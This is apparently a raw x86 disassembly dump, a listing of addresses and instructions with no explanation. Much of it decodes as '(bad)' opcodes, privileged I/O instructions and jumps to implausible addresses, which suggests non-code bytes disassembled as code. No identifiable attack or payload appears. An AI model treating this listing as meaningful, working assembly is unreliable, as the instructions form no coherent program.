  426e75:	mov    eax,ds:0x188dc12a
  426e7a:	mov    esi,0xa2095522
  426e7f:	ret    0x4dad
  426e82:	xchg   edx,eax
  426e83:	and    BYTE PTR [ecx+0x15966d4b],al
  426e89:	and    DWORD PTR [edx+0x6b],esp
  426e8c:	push   edi
  426e8d:	rol    BYTE PTR [ebp+0x534e755],cl
  426e93:	jmp    0x802f701a
  426e98:	rcr    BYTE PTR [ebx+0x3f],1
  426e9b:	les    ebx,FWORD PTR [edi-0x78]
  426e9e:	out    0x4e,eax
  426ea0:	inc    eax
  426ea1:	cwde   
  426ea2:	clc    
  426ea3:	xchg   esp,eax
  426ea4:	xor    edx,DWORD PTR [edi]
  426ea6:	xor    ch,al
  426ea8:	sbb    BYTE PTR [ecx-0x26],ch
  426eab:	and    eax,0x89821fd1
  426eb0:	sub    al,0x68
  426eb2:	pop    ebx
  426eb3:	and    eax,0x9182242b
  426eb8:	xchg   ecx,eax
  426eb9:	lea    esp,[ecx+edi*4-0xe7d7883]
  426ec0:	idiv   DWORD PTR [edx+0x18]
  426ec3:	ds test al,0x38
  426ec6:	dec    esp
  426ec7:	lds    ecx,FWORD PTR [esi+0x2d]
  426eca:	inc    ecx
  426ecb:	test   BYTE PTR [ebp+edi*2+0x25],bl
  426ecf:	jns    0x426f38
  426ed1:	add    ebp,ebp
  426ed3:	push   esp
  426ed4:	adc    eax,0x2e53bb6e
  426ed9:	mov    ah,0x66
  426edb:	nop
  426edc:	dec    edx
  426edd:	push   eax
  426ede:	cmp    eax,DWORD PTR [ecx]
  426ee0:	and    DWORD PTR [eax],edx
  426ee2:	inc    ebp
  426ee3:	cmp    BYTE PTR [esi],al
  426ee5:	sbb    ah,BYTE PTR [esi]
  426ee7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  426ee9:	test   eax,0x9dd45a6e
  426eee:	push   0xb213ba66
  426ef3:	or     BYTE PTR [ebp-0xf],dh
  426ef6:	pop    ds
  426ef7:	xchg   esi,eax
  426ef8:	fisubr DWORD PTR [edi+edi*8+0x51]
  426efc:	push   es
  426efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426efe:	cmp    ecx,DWORD PTR [edi+eiz*1-0x5c3bf2e9]
  426f05:	lahf   
  426f06:	dec    BYTE PTR [ecx+0x48]
  426f09:	mov    cs,WORD PTR ds:0xd65f2909
  426f0f:	aad    0x6e
  426f11:	mov    ds:0x186ae9b9,eax
  426f16:	jp     0x426eac
  426f18:	mov    esi,0xdbd99336
  426f1d:	mov    ah,0xb6
  426f1f:	in     al,dx
  426f20:	hlt    
  426f21:	fadd   QWORD PTR ds:[ecx+0x5b]
  426f26:	xchg   DWORD PTR [edx+0x7f],edx
  426f29:	xchg   ecx,eax
  426f2a:	fsubr  DWORD PTR [ebp+0x1d35a52d]
  426f30:	nop
  426f31:	stos   DWORD PTR es:[edi],eax
  426f32:	xchg   ebp,eax
  426f33:	rcl    edx,cl
  426f35:	jb     0x426efa
  426f37:	jle    0x426f7a
  426f39:	cld    
  426f3a:	and    DWORD PTR [esi],esi
  426f3c:	aam    0xfd
  426f3e:	sbb    esp,esp
  426f40:	lods   eax,DWORD PTR ds:[esi]
  426f41:	dec    esp
  426f42:	push   ebx
  426f43:	mov    DWORD PTR [eax-0x19],ebp
  426f46:	je     0x426f08
  426f48:	cld    
  426f49:	repz pop eax
  426f4b:	inc    eax
  426f4c:	out    dx,eax
  426f4d:	std    
  426f4e:	cwde   
  426f4f:	dec    ecx
  426f50:	lock sub DWORD PTR [ebx+0x69],edx
  426f54:	retf   
  426f55:	pushf  
  426f56:	dec    esi
  426f57:	push   eax
  426f58:	stos   DWORD PTR es:[edi],eax
  426f59:	push   edi
  426f5a:	out    0xff,al
  426f5c:	sbb    al,0x42
  426f5e:	clc    
  426f5f:	mov    al,0xe6
  426f61:	(bad)  
  426f62:	cmp    dh,BYTE PTR [ebx+edx*8+0xc]
  426f66:	mov    ch,0x3f
  426f68:	stc    
  426f69:	dec    ebx
  426f6a:	jae    0x426fb5
  426f6c:	sub    DWORD PTR cs:[ecx],0x7d
  426f70:	test   BYTE PTR [eax-0x64],bh
  426f73:	fimul  DWORD PTR [ecx]
  426f75:	and    al,0xbb
  426f77:	lahf   
  426f78:	into   
  426f79:	jmp    0x426f53
  426f7b:	dec    edi
  426f7c:	xchg   ecx,eax
  426f7d:	iret   
  426f7e:	mov    dl,0x4b
  426f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f82:	popfw  
  426f84:	not    ecx
  426f86:	sti    
  426f87:	cmp    al,0xb6
  426f89:	mov    ebp,0x444ff6f4
  426f8e:	xchg   esi,eax
  426f8f:	dec    ecx
  426f90:	jmp    DWORD PTR [edi-0xf53d86]
  426f96:	or     al,bh
  426f98:	(bad)  
  426f99:	andnps xmm3,XMMWORD PTR [esi+0x10edc3af]
  426fa0:	frstor [ebp-0x40]
  426fa3:	ins    DWORD PTR es:[edi],dx
  426fa4:	loope  0x42701d
  426fa6:	mov    ah,0x98
  426fa8:	jecxz  0x426f8f
  426faa:	pop    ds
  426fab:	cmc    
  426fac:	mov    cl,0x8
  426fae:	inc    esi
  426faf:	ja     0x426fe3
  426fb1:	ror    DWORD PTR ds:0x4c6d3bc3,1
  426fb7:	cmp    ah,cl
  426fb9:	pop    ebp
  426fba:	inc    edx
  426fbb:	or     ebx,DWORD PTR [edi+0x29]
  426fbe:	jae    0x426fd9
  426fc0:	mov    ds:0xd3e49b6b,eax
  426fc5:	ss jnp 0x426f64
  426fc8:	fs push edi
  426fca:	es xchg ebx,eax
  426fcc:	adc    al,0xe7
  426fce:	fld    QWORD PTR [ebx-0x4cbdb446]
  426fd4:	and    ch,BYTE PTR [ebx-0x429c5c5f]
  426fda:	dec    esi
  426fdb:	scas   al,BYTE PTR es:[edi]
  426fdc:	jle    0x427022
  426fde:	je     0x426f89
  426fe0:	repz cmp esp,esp
  426fe3:	jne    0x427021
  426fe5:	mov    cl,0xa0
  426fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fe8:	scas   al,BYTE PTR es:[edi]
  426fe9:	add    eax,0x3d39a059
  426fee:	ss sahf 
  426ff0:	xchg   edi,eax
  426ff1:	or     ecx,DWORD PTR [ecx+0x71]
  426ff4:	mov    dl,0x48
  426ff6:	jnp    0x427052
  426ff8:	add    BYTE PTR [esi+0x6ce43f50],dh
  426ffe:	ror    BYTE PTR [ebp-0x49],cl
  427001:	sbb    bl,bl
  427003:	fisub  DWORD PTR ss:[ecx-0x28]
  427007:	push   edi
  427008:	test   al,0x4
  42700a:	mov    dh,0x54
  42700c:	in     eax,dx
  42700d:	jg     0x426f95
  42700f:	inc    ebp
  427010:	in     eax,0xc2
  427012:	inc    BYTE PTR [edx+0x33]
  427015:	mov    bh,0x3
  427017:	push   edx
  427018:	stc    
  427019:	mov    dl,0x37
  42701b:	push   ss
  42701c:	arpl   WORD PTR [esi+0x6b563f3d],bx
  427022:	xchg   esp,eax
  427023:	test   ebp,eax
  427025:	ins    BYTE PTR es:[edi],dx
  427026:	cmp    BYTE PTR [ebp+eiz*1+0x1f],bh
  42702a:	cmp    al,0xc1
  42702c:	inc    edx
  42702d:	mov    BYTE PTR [ebx-0x1bff0534],dl
  427033:	xor    dl,BYTE PTR [edx]
  427035:	pop    edi
  427036:	add    BYTE PTR [eax],ch
  427038:	jne    0x427094
  42703a:	add    cl,BYTE PTR [esi+0x2a]
  42703d:	dec    esp
  42703e:	xlat   BYTE PTR ds:[ebx]
  42703f:	jmp    0x214b:0x58fd24c0
  427046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427047:	push   cs
  427048:	out    dx,eax
  427049:	cmp    eax,DWORD PTR [ecx]
  42704b:	cli    
  42704c:	pop    ds
  42704d:	mov    dl,0xa1
  42704f:	dec    ebx
  427050:	shr    BYTE PTR [esi+eiz*8],1
  427053:	in     al,dx
  427054:	sub    cl,BYTE PTR [ebx+0x7f52f87e]
  42705a:	(bad)  
  42705b:	pop    ss
  42705c:	sub    al,0x8
  42705e:	jg     0x42705f
  427060:	mov    ds:0x13281898,eax
  427065:	mov    ch,0x9a
  427067:	neg    ebx
  427069:	pop    edi
  42706a:	fwait
  42706b:	xor    al,0x3f
  42706d:	in     al,dx
  42706e:	(bad)  
  42706f:	jnp    0x42707e
  427071:	ins    DWORD PTR es:[edi],dx
  427072:	jecxz  0x427074
  427074:	mov    esp,0x3d96e0f3
  427079:	sbb    eax,0x13d6d7d
  42707e:	pop    ebp
  42707f:	push   ss
  427080:	add    dh,BYTE PTR [ebx]
  427082:	es push ax
  427085:	inc    esp
  427086:	push   edx
  427087:	hlt    
  427088:	icebp  
  427089:	dec    esi
  42708a:	imul   ebx,DWORD PTR [ebx],0x6f
  42708d:	outs   dx,DWORD PTR ds:[esi]
  42708e:	jl     0x4270a6
  427090:	mov    ch,0xb7
  427092:	imul   eax,edi,0x72255dcc
  427098:	icebp  
  427099:	test   DWORD PTR [eax+0x5c],0x21f3b8ed
  4270a0:	stc    
  4270a1:	outs   dx,BYTE PTR ds:[esi]
  4270a2:	push   esp
  4270a3:	in     eax,dx
  4270a4:	sbb    esi,esp
  4270a6:	sub    al,0x21
  4270a8:	mov    esp,0x3957f6f4
  4270ad:	pushf  
  4270ae:	jmp    0x427034
  4270b0:	cld    
  4270b1:	and    BYTE PTR ds:0xa6b10c33,al
  4270b7:	aad    0x8e
  4270b9:	dec    eax
  4270ba:	out    dx,eax
  4270bb:	fmul   st(7),st
  4270bd:	(bad)  
  4270be:	nop
  4270bf:	shl    DWORD PTR [ecx+edx*1],1
  4270c2:	rcr    DWORD PTR [esi-0x29],1
  4270c5:	mov    edi,0x21edf8d9
  4270ca:	fidiv  DWORD PTR [ebx]
  4270cc:	scas   eax,DWORD PTR es:[edi]
  4270cd:	pusha  
  4270ce:	xor    eax,0x99344fc7
  4270d3:	mov    ds:0xe3674486,al
  4270d8:	(bad)  
  4270d9:	xchg   edx,eax
  4270da:	sub    DWORD PTR [edx-0x42f49b7b],ebp
  4270e0:	mov    dl,BYTE PTR [esi-0x51]
  4270e3:	jbe    0x42708d
  4270e5:	js     0x4270d9
  4270e7:	jge    0x427099
  4270e9:	cld    
  4270ea:	jbe    0x4270e0
  4270ec:	xor    edi,DWORD PTR [edx]
  4270ee:	push   0xae8fe3de
  4270f3:	fwait
  4270f4:	(bad)  
  4270f5:	fist   DWORD PTR [edx+edi*2-0x1a]
  4270f9:	rcr    DWORD PTR [edi-0x53],0xd9
  4270fd:	in     al,0x5f
  4270ff:	in     al,0x70
  427101:	adc    eax,DWORD PTR [ebx]
  427103:	js     0x42716e
  427105:	dec    edx
  427106:	icebp  
  427107:	inc    ecx
  427108:	jnp    0x4270d8
  42710a:	fcomp  DWORD PTR [ebx]
  42710c:	and    al,0xc
  42710e:	jno    0x427123
  427110:	repz inc ebp
  427112:	inc    edx
  427113:	jno    0x42712f
  427115:	call   0x2a673db8
  42711a:	popf   
  42711b:	sbb    BYTE PTR [edi+ecx*4],dh
  42711e:	rol    DWORD PTR gs:[edx+0x203a082],1
  427125:	sti    
  427126:	fs add al,0x7c
  427129:	mov    bh,0xff
  42712b:	je     0x42716a
  42712d:	or     ebp,DWORD PTR [ebp+0x72d5fc5d]
  427133:	outs   dx,DWORD PTR ds:[esi]
  427134:	retf   0xeacb
  427137:	mov    dl,0xf2
  427139:	add    BYTE PTR [esi+0x44],ch
  42713c:	sahf   
  42713d:	shr    DWORD PTR [ecx-0x20a8d4d4],1
  427143:	xor    edx,DWORD PTR [ecx+0x2f]
  427146:	enter  0x1cbe,0x4
  42714a:	sbb    BYTE PTR [esp+eiz*8+0x2d074a8e],bl
  427151:	xchg   ebp,eax
  427152:	xor    ebp,DWORD PTR [eax]
  427154:	inc    eax
  427155:	call   0xb10bdddd
  42715a:	aad    0x41
  42715c:	and    esi,ebp
  42715e:	inc    eax
  42715f:	ins    BYTE PTR es:[edi],dx
  427160:	call   0x29987804
  427165:	pop    eax
  427166:	adc    BYTE PTR [edi-0x33],ah
  427169:	mov    dl,0x68
  42716b:	push   ds
  42716c:	pushf  
  42716d:	and    al,0xe0
  42716f:	ret    
  427170:	rcl    BYTE PTR [edx+0x20],cl
  427173:	inc    edx
  427174:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427176:	out    dx,eax
  427177:	jmp    0x427181
  427179:	ins    DWORD PTR es:[edi],dx
  42717a:	jecxz  0x4271cb
  42717c:	jle    0x4271a8
  42717e:	add    ah,BYTE PTR [ecx+edx*8]
  427181:	aad    0x87
  427183:	cmc    
  427184:	das    
  427185:	retf   
  427186:	aad    0x9d
  427188:	(bad)  
  427189:	shr    DWORD PTR [esi-0x5e24d6b9],cl
  42718f:	int3   
  427190:	mov    al,0x1b
  427192:	xchg   esp,eax
  427193:	jle    0x4271a4
  427195:	das    
  427196:	cld    
  427197:	outs   dx,DWORD PTR ds:[esi]
  427198:	mov    bh,BYTE PTR [ebx+0x720c62d5]
  42719e:	sub    BYTE PTR [edi-0x3167192d],ah
  4271a4:	addr16 xchg edx,eax
  4271a6:	xor    DWORD PTR [edi+0x44],0xffffffba
  4271aa:	adc    bl,BYTE PTR [esi]
  4271ac:	mov    ch,0x82
  4271ae:	cli    
  4271af:	mov    esi,0xbeefb05d
  4271b4:	push   ds
  4271b5:	push   0xffffffc4
  4271b7:	pop    esi
  4271b8:	dec    eax
  4271b9:	mov    edi,0x1d8acd5b
  4271be:	jmp    0x1f7d62fb
  4271c3:	enter  0x9f00,0xc5
  4271c7:	jno    0x4271b5
  4271c9:	mov    al,ds:0xa6a51a4e
  4271ce:	jo     0x4271dc
  4271d0:	sbb    DWORD PTR [ebp+0x71],0x4017fb1a
  4271d7:	jmp    0xbf6f:0x417ca71c
  4271de:	or     ah,bl
  4271e0:	jge    0x4271a8
  4271e2:	sbb    ebp,DWORD PTR [ecx-0x49b5317b]
  4271e8:	dec    ebp
  4271e9:	sti    
  4271ea:	paddb  mm5,QWORD PTR [ebx-0x5b]
  4271ee:	cwde   
  4271ef:	dec    ebx
  4271f0:	cdq    
  4271f1:	cdq    
  4271f2:	int    0x12
  4271f4:	(bad)  
  4271f5:	fbstp  TBYTE PTR [edi+0x35]
  4271f8:	test   DWORD PTR [ecx+0x5a],esi
  4271fb:	adc    edx,DWORD PTR [edx]
  4271fd:	xlat   BYTE PTR ds:[ebx]
  4271fe:	add    esi,esp
  427200:	test   BYTE PTR [eax],bl
  427202:	cmp    ebx,DWORD PTR [ebp+0x18]
  427205:	mov    dl,dl
  427207:	push   edi
  427208:	sub    DWORD PTR [ecx+esi*1-0x2d],esi
  42720c:	ds cs jle 0x42726b
  427210:	cmp    ch,dh
  427212:	pop    esi
  427213:	xchg   esp,eax
  427214:	lock xor BYTE PTR [ebp-0x4008d389],0x53
  42721c:	sbb    DWORD PTR [eax],edi
  42721e:	push   sp
  427220:	jae    0x4271c2
  427222:	push   edi
  427223:	add    BYTE PTR [eax],al
  427225:	add    BYTE PTR [eax],al
  427227:	add    BYTE PTR [eax],al
  427229:	add    BYTE PTR [ecx+0x4f],bl
  42722c:	dec    esi
  42722d:	dec    ebp
  42722e:	pop    esi
  42722f:	dec    ebp
  427230:	pop    ebx
  427231:	pop    edi
  427232:	in     eax,dx
  427233:	fld    st(4)
  427235:	shl    BYTE PTR [edx+0x70],0xb8
  427239:	cdq    
  42723a:	inc    DWORD PTR fs:[ecx]
  42723d:	add    BYTE PTR [ecx],al
  42723f:	add    BYTE PTR [eax],al
  427241:	add    BYTE PTR [esi+0x0],dl
  427244:	add    BYTE PTR [eax],al
  427246:	add    BYTE PTR [eax],al
  427248:	add    BYTE PTR [eax],al
  42724a:	dec    ebp
  42724b:	push   ebp
  42724c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427252:	mov    esp,ebp
  427254:	or     al,ah
  427256:	dec    ebp
  427257:	add    bh,al
  427259:	add    BYTE PTR [eax],cl
  42725b:	add    BYTE PTR [eax],al
  42725d:	mov    DWORD PTR [eax],0x3ef44545
  427263:	cmp    BYTE PTR [eax],al
  427265:	test   DWORD PTR [ebx-0x34070b64],ecx
  42726b:	(bad)  
  42726c:	enter  0x4d45,0xb8
  427270:	mov    edi,DWORD PTR [ecx]
  427272:	hlt    
  427273:	test   ebx,ecx
  427275:	pushf  
  427276:	enter  0x4df8,0x8b
  42727a:	mov    DWORD PTR [ebp+0x8],0x894708
  427281:	inc    ebp
  427282:	mov    ebp,0xff8bfffc
  427287:	dec    ebp
  427288:	mov    ch,0xf4
  42728a:	call   DWORD PTR [ebx-0x1]
  42728d:	mov    ebx,0x8005022
  427292:	call   DWORD PTR [ecx+0x8]
  427295:	pop    es
  427296:	jmp    0xb8:0x9cb4533
  42729d:	cwde   
  42729e:	mov    esi,DWORD PTR [edx-0xc]
  4272a1:	xor    al,bl
  4272a3:	add    BYTE PTR [eax+0x3c83203],bl
  4272a9:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  4272af:	mov    eax,DWORD PTR [ebx-0xb87b3]
  4272b5:	xor    eax,DWORD PTR [eax]
  4272b7:	retf   
  4272b8:	ret    
  4272b9:	add    eax,esi
  4272bb:	enter  0x8945,0x64
  4272bf:	dec    ebp
  4272c0:	sbb    ah,cl
  4272c2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272c8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ce:	test   DWORD PTR [ebx],esi
  4272d0:	dec    ebx
  4272d2:	inc    DWORD PTR [ebx]
  4272d4:	inc    eax
  4272d5:	enter  0x8989,0x64
  4272d9:	(bad)  
  4272da:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272de:	cld    
  4272df:	dec    DWORD PTR [ebp-0xa90001]
  4272e5:	push   edi
  4272e6:	mov    BYTE PTR [edx+0x1],ch
  4272e9:	and    BYTE PTR [eax],al
  4272eb:	pop    ecx
  4272ec:	inc    ebp
  4272ed:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272f3:	push   0xffffff89
  4272f5:	pop    ecx
  4272f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272f7:	dec    ebp
  4272f8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272fe:	jne    0x427348
  427300:	lea    eax,[eax]
  427302:	fs (bad) 
  427304:	dec    DWORD PTR [eax]
  427306:	mov    DWORD PTR [eax],eax
  427308:	test   al,0x0
  42730a:	add    BYTE PTR [ebp-0x18],cl
  42730d:	xor    ebp,DWORD PTR [edx]
  42730f:	add    eax,DWORD PTR [eax]
  427311:	mov    eax,eax
  427313:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  42731a:	inc    ebp
  42731b:	mov    DWORD PTR [ebx+0x459408],ecx
  427321:	popa   
  427322:	mov    esp,DWORD PTR [ebp-0x75]
  427325:	(bad)  
  427326:	cld    
  427327:	inc    eax
  427328:	cmp    bh,0x1
  42732b:	lea    eax,[eax]
  42732d:	and    BYTE PTR [eax],al
  42732f:	inc    DWORD PTR [ecx-0x18]
  427332:	mov    ecx,DWORD PTR [ebx]
  427334:	cld    
  427335:	add    BYTE PTR [ecx+0x75014d],cl
  42733b:	(bad)  
  42733c:	xchg   ebp,eax
  42733d:	sar    bh,1
  42733f:	inc    eax
  427340:	inc    DWORD PTR [eax]
  427342:	mov    eax,DWORD PTR [ebp-0x4]
  427345:	xor    edx,DWORD PTR [edx+0x7201be]
  42734b:	add    BYTE PTR [edx],dl
  42734d:	(bad)  
  42734e:	nop
  42734f:	inc    ebp
  427350:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427356:	mov    al,0xff
  427358:	add    bh,bh
  42735a:	add    BYTE PTR [ebx],dh
  42735c:	inc    DWORD PTR [ebx]
  42735e:	sbb    al,0x89
  427360:	jne    0x42733e
  427362:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427368:	mov    eax,DWORD PTR [ebp-0xff0048]
  42736e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427375:	inc    DWORD PTR [ebp-0x75]
  427378:	fisttp QWORD PTR [eax+ebp*8]
  42737b:	test   DWORD PTR [esi-0x1],esp
  42737e:	inc    ebp
  42737f:	(bad)  
  427380:	aas    
  427381:	inc    ebp
  427382:	(bad)  
  427383:	lea    edi,[eax+edi*2-0x1]
  427387:	inc    edi
  427389:	mov    DWORD PTR ds:0x8000c7a0,edi
  42738f:	mov    ebp,esi
  427391:	cld    
  427392:	in     al,0x8d
  427394:	inc    ebp
  427395:	(bad)  
  427396:	call   0xc7cb539a
  42739b:	add    DWORD PTR [eax-0x11ba1500],ecx
  4273a1:	inc    DWORD PTR [ebp-0x4]
  4273a4:	out    0x8d,eax
  4273a6:	aas    
  4273a7:	(bad)  
  4273a8:	call   0xca9eac
  4273ad:	add    DWORD PTR [ebx-0x7f570400],ecx
  4273b3:	add    BYTE PTR [ecx],al
  4273b5:	test   DWORD PTR [eax],eax
  4273b7:	wrmsr  
  4273b9:	jae    0x4273a8
  4273bb:	add    BYTE PTR [eax],al
  4273bd:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273c3:	add    esp,edi
  4273c5:	add    BYTE PTR [eax+0x450108],al
  4273cb:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ce:	add    DWORD PTR [eax],0x4
  4273d1:	mov    eax,DWORD PTR [ebp+0x3]
  4273d4:	mov    edi,DWORD PTR [esp+edi*8]
  4273d7:	dec    ebp
  4273d8:	nop
  4273d9:	mov    eax,DWORD PTR [ecx]
  4273db:	fadd   DWORD PTR [eax]
  4273dd:	add    BYTE PTR [esi],al
  4273df:	lea    eax,[eax]
  4273e1:	pusha  
  4273e2:	push   eax
  4273e3:	inc    DWORD PTR [ebp+0x52]
  4273e6:	call   DWORD PTR [ebp-0x7b]
  4273e9:	mov    esi,DWORD PTR [ebp-0x74]
  4273ec:	mov    eax,DWORD PTR [eax]
  4273ee:	cld    
  4273ef:	mov    eax,DWORD PTR [eax+0x880103]
  4273f5:	add    BYTE PTR [ebp+0x6a],bh
  4273f8:	cmp    edi,0x10
  4273fb:	mov    WORD PTR [ebp+0x0],es
  4273fe:	mov    edx,DWORD PTR [edx-0x4]
  427401:	push   ecx
  427402:	nop
  427403:	inc    DWORD PTR [ecx]
  427405:	cld    
  427406:	add    BYTE PTR [ebp-0x24],bh
  427409:	mov    eax,DWORD PTR [eax]
  42740b:	cld    
  42740c:	push   eax
  42740d:	nop
  42740e:	inc    ebp
  42740f:	add    edi,edi
  427411:	add    BYTE PTR [ebx+0x4de4f445],cl
  427417:	in     al,dx
  427418:	xor    eax,edi
  42741a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427421:	mov    DWORD PTR [eax],0xb8788b98
  427427:	test   ebx,eax
  427429:	jmp    FWORD PTR [eax-0x1]
  42742c:	int    0xed
  42742e:	sub    esp,eax
  427430:	add    eax,DWORD PTR [ebp-0x30]
  427433:	fild   WORD PTR [ebp+0x3f]
  427436:	cmp    eax,edi
  427438:	je     0xca43545a
  42743e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427445:	(bad)  
  427446:	jne    0x4273d4
  427448:	mov    ebx,ebp
  42744a:	cld    
  42744b:	js     0x427492
  42744d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427453:	inc    ebp
  427454:	call   0xea9de4
  427459:	add    BYTE PTR [ebx-0x7f170301],cl
  42745f:	add    DWORD PTR es:[eax],eax
  427462:	add    al,al
  427464:	xor    BYTE PTR [eax+0x41],dl
  427467:	inc    ebp
  427468:	add    BYTE PTR [ebx+0xfcd88b],cl
  42746e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427474:	add    DWORD PTR [ecx+0x458be845],ecx
  42747a:	fmul   DWORD PTR [ebx+0x8bb800]
  427480:	cld    
  427481:	call   0xd79f46
  427486:	dec    DWORD PTR [ebx+0x1090e8ff]
  42748c:	add    al,al
  42748e:	push   eax
  42748f:	es inc ebp
  427491:	inc    ebp
  427492:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427498:	dec    DWORD PTR [ebx-0x3ff70301]
  42749e:	mov    DWORD PTR gs:[eax],eax
  4274a1:	call   0x8b6aba66
  4274a6:	inc    ebp
  4274a7:	mov    eax,0xe8d8008b
  4274ac:	add    BYTE PTR [ecx],ch
  4274ae:	mov    eax,DWORD PTR [eax]
  4274b0:	cld    
  4274b1:	mov    eax,eax
  4274b3:	call   0x462a850d
  4274b8:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4274be:	cld    
  4274bf:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274c6:	xor    BYTE PTR [eax],al
  4274c8:	push   edi
  4274c9:	inc    ebp
  4274ca:	mov    DWORD PTR [ebx],esi
  4274cc:	in     al,0xb9
  4274ce:	inc    ebp
  4274cf:	lea    ecx,[ebx-0x3c370301]
  4274d5:	dec    ebp
  4274d6:	cwde   
  4274d7:	mov    esi,DWORD PTR [edx]
  4274d9:	or     BYTE PTR [ebx],al
  4274db:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274e2:	call   0x429e2c
  4274e7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274ed:	jge    0x427522
  4274ef:	mov    eax,DWORD PTR [ebx]
  4274f1:	cld    
  4274f2:	lea    edx,[eax+0xff0120]
  4274f8:	call   0x429e8c
  4274fd:	push   eax
  4274fe:	inc    DWORD PTR [ebp-0x1c]
  427501:	mov    ecx,DWORD PTR [ebp-0x58]
  427504:	xor    eax,DWORD PTR [eax]
  427506:	add    edi,edi
  427508:	cmp    ebp,eax
  42750a:	jne    0x427532
  42750c:	mov    DWORD PTR [eax],0x8b004dd8
  427512:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427519:	mov    eax,ebx
  42751b:	cld    
  42751c:	test   BYTE PTR [eax+0x320198],bh
  427522:	mov    DWORD PTR [ebp+0x8],esi
  427525:	xor    eax,DWORD PTR [ebp-0x73]
  427528:	test   DWORD PTR [esp+esi*2-0x1],edi
  42752c:	mov    ebp,eax
  42752e:	mov    eax,0x33004d29
  427533:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427539:	add    DWORD PTR [eax],eax
  42753b:	add    BYTE PTR [ebp+0x30],al
  42753e:	mov    edx,DWORD PTR [edi-0x48]
  427541:	add    ebx,0xffffffe4
  427544:	push   0x2b74cd85
  427549:	mov    eax,DWORD PTR [ebx]
  42754b:	cld    
  42754c:	sar    BYTE PTR [eax+0x3b0145],1
  427552:	pcmpeqw mm4,mm6
  427555:	xor    edi,edi
  427557:	lea    ecx,[ebx-0x239c7470]
  42755d:	add    BYTE PTR [ebp+0x50],cl
  427560:	cmp    eax,DWORD PTR [ebp+0x75]
  427563:	mov    ebp,DWORD PTR [eax-0x68]
  427566:	test   DWORD PTR [eax],eax
  427568:	clc    
  427569:	push   DWORD PTR [ebp-0x1]
  42756c:	lea    ecx,[eax]
  42756e:	int3   
  42756f:	inc    ebp
  427570:	call   0xfaa600
  427575:	jne    0x42756f
  427577:	xor    edi,DWORD PTR [ebp-0x41]
  42757a:	jmp    0x4275ee
  42757c:	mov    eax,DWORD PTR [eax]
  42757e:	mov    eax,0x339545c7
  427583:	inc    DWORD PTR [ebx]
  427585:	push   DWORD PTR [ecx]
  427587:	aaa    
  427588:	mov    eax,DWORD PTR [eax]
  42758a:	jmp    0x4275dc
  42758c:	mov    eax,DWORD PTR [ebp-0x3c]
  42758f:	mov    eax,eax
  427591:	cld    
  427592:	clc    
  427593:	ret    
  427594:	test   bh,al
  427596:	pop    es
  427597:	xchg   ebp,eax
  427598:	add    bh,bh
  42759a:	inc    ebp
  42759b:	dec    DWORD PTR [edi]
  42759d:	and    DWORD PTR [ebx],ebp
  42759f:	add    BYTE PTR [eax],al
  4275a1:	push   eax
  4275a2:	jbe    0x4275f9
  4275a4:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4275aa:	or     al,0xcf
  4275ac:	inc    eax
  4275ad:	enter  0x745,0x72
  4275b1:	inc    ebp
  4275b2:	mov    eax,DWORD PTR [ecx]
  4275b4:	int3   
  4275b5:	add    BYTE PTR [ebp-0x75],al
  4275b8:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  4275be:	ror    BYTE PTR [ebp+0x72f80885],1
  4275c4:	inc    ebp
  4275c5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275cb:	fadd   st,st(6)
  4275cd:	rol    BYTE PTR [ebp+0x12],0x8b
  4275d1:	inc    ebp
  4275d2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275d8:	inc    ebp
  4275d9:	test   bh,al
  4275db:	cwde   
  4275dc:	clc    
  4275dd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275e3:	inc    ebp
  4275e4:	cmp    dh,BYTE PTR [ebx]
  4275e6:	pushf  
  4275e7:	mov    ecx,0xffb48dc7
  4275ec:	test   eax,ecx
  4275ee:	clc    
  4275ef:	dec    ebp
  4275f0:	inc    ebp
  4275f1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275f4:	pushf  
  4275f5:	rol    edi,0x86
  4275f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275f9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275ff:	inc    ebp
  427600:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427608:	test   DWORD PTR [eax],edi
  42760a:	clc    
  42760b:	pushf  
  42760c:	inc    ebp
  42760d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427613:	push   eax
  427614:	(bad)  
  427615:	cld    
  427616:	jge    0x427618
  427618:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42761e:	add    BYTE PTR [ebx],dl
  427620:	jmp    0xcd7772
